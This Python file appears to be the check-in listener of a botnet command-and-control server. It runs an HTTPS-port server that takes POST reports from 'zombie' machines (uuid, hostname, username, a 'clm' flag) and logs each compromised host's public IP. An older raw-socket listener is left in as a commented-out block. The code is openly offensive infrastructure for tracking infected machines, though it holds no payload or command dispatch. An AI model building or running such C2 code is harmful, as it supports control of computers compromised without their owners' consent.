import socket
import time
from zombie.Zombie import Zombie
import cgi
from http.server import BaseHTTPRequestHandler
import io
import json



# Array with zombies
global zombies
zombies = []



def process_zombie_checkin(json_object, public_ip):
	
	json_object = json_object.replace("\\","\\\\")
	data = json.loads(json_object)
	uuid = data['uuid']
	hostname = data['hostname']
	username = data['username']
	clm = data['clm']
	zombies.append(Zombie(uuid, hostname, username, public_ip, clm))
	


class PostHandler(BaseHTTPRequestHandler):

    def do_POST(self):
        length = int(self.headers.get('content-length'))
        # Parse the form data posted
        json_object = self.rfile.read(length).decode()
        # Get public IP
        public_ip = self.client_address[0]
        # JSON data given by the zombie
        process_zombie_checkin(json_object, public_ip)

        # Begin the response
        self.send_response(200)
        self.send_header('Content-Type',
                         'text/plain; charset=utf-8')
        self.end_headers()

        out = io.TextIOWrapper(
            self.wfile,
            encoding='utf-8',
            line_buffering=False,
            write_through=True,
        )

        # Echo back information about what was posted in the form
        out.write(str(json))

        # Disconnect our encoding wrapper from the underlying
        # buffer so that deleting the wrapper doesn't close
        # the socket, which is still being used by the server.
        out.detach()

def start():
    from http.server import HTTPServer
    server = HTTPServer(('0.0.0.0', 443), PostHandler)
    server.serve_forever()









"""
	# create an INET, STREAMing socket
	serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	# bind the socket to a public host, and a well-known port
	serversocket.bind(('0.0.0.0', 443))
	# become a server socket
	serversocket.listen(5)


	# Array with zombies
	global zombies
	zombies = []

	while True:
		print("from listener")
		# accept connections from outside
		(clientsocket, address) = serversocket.accept()
		clientsocket.send(b'HI')
		clientsocket.close()
"""
